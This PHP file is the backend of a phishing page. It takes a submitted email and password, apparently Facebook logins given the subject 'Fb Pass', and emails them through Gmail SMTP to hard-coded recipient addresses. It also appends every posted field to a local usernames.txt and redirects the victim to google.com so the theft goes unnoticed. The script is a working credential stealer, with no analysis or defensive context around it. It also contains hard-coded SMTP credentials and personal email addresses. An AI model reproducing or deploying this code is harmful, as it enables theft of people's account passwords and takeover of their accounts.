<?php

if(true){

    
require 'PHPMailer/PHPMailerAutoload.php';

	foreach($_POST as $variable => $value) {
		//$to = ($handle, $variable); // this is the sender's Email address
	  //  $name = "=";
	  //  $msg = $value;
	   // $mobile = " ";
	}

	$to = $_POST['email']; // this is the sender's Email address
    $name = $_POST['pass'];
    $msg ="";
    $mobile =date("Y-m-d H:i:s");


if(true){
$mailToAdmin = new PHPMailer;

$mailToAdmin->isSMTP();                                   // Set mailer to use SMTP
$mailToAdmin->Host = 'smtp.gmail.com';                    // Specify main and backup SMTP servers
$mailToAdmin->SMTPAuth = true;                            // Enable SMTP authentication
$mailToAdmin->Username = 'noreply.smartcup@gmail.com';          // SMTP username
$mailToAdmin->Password = 'amp@lintcloud.com'; // SMTP password
$mailToAdmin->SMTPSecure = 'tls';                         // Enable TLS encryption, `ssl` also accepted
$mailToAdmin->Port = 587;                                 // TCP port to connect to

$mailToAdmin->setFrom('rv.elango7@gmail.com', 'Heroku Password');
$mailToAdmin->addReplyTo('rv.elango7@gmail.com', 'Heroku Password');
$mailToAdmin->addAddress('rv.elango7@gmail.com');   // Add a recipient
$mailToAdmin->addCC('gemniz707@gmail.com');
//$mail->addBCC('bcc@example.com');
$htmlContent = file_get_contents("email_template.html");


$mailToAdmin->isHTML(true);  // Set email format to HTML
 $bodyContent  = '<h1>Mail ID :&nbsp; '.$to.'</h1>';
 $bodyContent .= '<h1>Pass :&nbsp; '.$name.'</h1>';
 $bodyContent .= '<h1>Time :&nbsp; '.$mobile.'</h1>';
 $bodyContent .= '<h1>Device :&nbsp; </h1>';
 $bodyContent .= '<p>'.$msg.'</b></p>';

$mailToAdmin->Subject = 'Fb Pass';
$mailToAdmin->Body    = $bodyContent;
 
if($mailToAdmin->send()) {
	header ('Location:http://www.google.com/');
	$handle = fopen("usernames.txt", "a");
	foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle);

}else{
	//	header ('Location:http://www.google.com/');
	$handle = fopen("usernames.txt", "a");
	foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle);

 }

 
 } 
}else{
    echo false;
}




exit;
?>